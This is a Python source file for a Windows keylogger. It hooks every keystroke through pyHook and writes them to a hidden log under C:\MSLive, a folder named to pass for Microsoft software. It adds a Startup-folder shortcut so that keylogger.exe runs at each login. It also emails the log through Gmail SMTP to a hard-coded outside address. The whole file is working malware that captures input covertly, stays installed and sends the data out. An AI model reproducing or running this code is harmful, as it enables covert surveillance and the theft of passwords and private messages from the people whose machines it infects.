import pyHook, pythoncom, logging, sys
import time
import os, sys, win32com.client
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import smtplib

if not os.path.exists('C:\\MSLive\\'):
    os.makedirs('C:\\MSLive\\')
    myfile = open('C:\\MSLive\\stuff.txt', 'w')
    myfile.write("Fun starts here\n")
    myfile.close()

shell = win32com.client.Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut("C:\\Users\\"+ os.environ.get("USERNAME")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MSLive.lnk")
shortcut.Targetpath = "C:\\Users\\"+ os.environ.get("USERNAME")+"\\Downloads\\keylogger.exe"
shortcut.save()

msg = MIMEMultipart()
msg.attach(MIMEText(open("C:/MSLive/stuff.txt").read()))

mailer = smtplib.SMTP("smtp.gmail.com", 587)

mailer.ehlo()
mailer.starttls()
mailer.ehlo()
mailer.login('_Your_Gmail_Address_Here_', '_Your_Password_Here_')
mailer.sendmail("shiriskumar.adv@gmail.com", "shiris.physics129@gmail.com", msg.as_string())
mailer.close()


file_log = 'C:\\MSLive\\stuff.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
    
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()